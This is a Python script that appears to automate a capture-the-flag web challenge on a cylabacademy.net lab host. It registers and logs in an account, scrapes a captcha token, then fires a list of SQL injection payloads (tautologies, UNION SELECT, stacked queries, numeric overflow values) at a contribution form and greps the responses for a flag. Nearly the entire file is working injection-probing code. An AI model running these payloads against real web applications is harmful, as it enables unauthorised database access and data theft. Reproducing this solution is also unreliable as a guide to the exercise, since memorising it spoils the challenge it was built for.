import sys, requests, urllib3, re, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:19299/"
s = requests.Session()
s.post(BASE + "register.php", data={"user": "sqli88", "pass": "pass88"}, timeout=15)
s.post(BASE + "index.php", data={"username": "sqli88", "password": "pass88"}, timeout=15)
payloads = ["1' OR '1'='1", "1'-- -", "1' UNION SELECT 1-- -", "1' AND 1=1-- -",
            "1'; SELECT 1-- -", "-1", "1e308", "1'||'1"]
for p in payloads:
    r = s.get(BASE + "index.php", timeout=15)
    cap = re.search(r'name="captcha" value="([^"]+)"', r.text)
    if not cap:
        continue
    r2 = s.post(BASE + "contribute.php", data={"captcha": cap.group(1), "moneys": p}, timeout=15)
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
    txt = re.sub(r"<[^>]+>", " ", r2.text)
    txt = re.sub(r"\s+", " ", txt)
    print("%-20s -> %d | %s" % (p[:20], len(r2.text), ("FLAG " + m.group(0)) if m else txt[:120]))
    if m:
        break
    time.sleep(0.3)
